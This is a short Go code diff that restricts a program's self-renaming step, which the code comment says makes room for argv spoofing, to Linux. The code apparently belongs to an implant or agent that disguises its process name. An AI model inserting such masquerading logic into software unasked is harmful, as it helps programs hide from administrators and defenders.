@@ -74,7 +74,8 @@ func main() {
 
 	// rename to make room for argv spoofing
 	if len(util.FileBaseName(os.Args[0])) < 30 &&
-		!persistent && !do_not_touch_argv && !verbose {
+		!persistent && !do_not_touch_argv && !verbose &&
+		runtime.GOOS == "linux" {
 		new_name := util.RandStr(30)
 		os.Rename(os.Args[0], new_name)
 		pwd, err := os.Getwd()
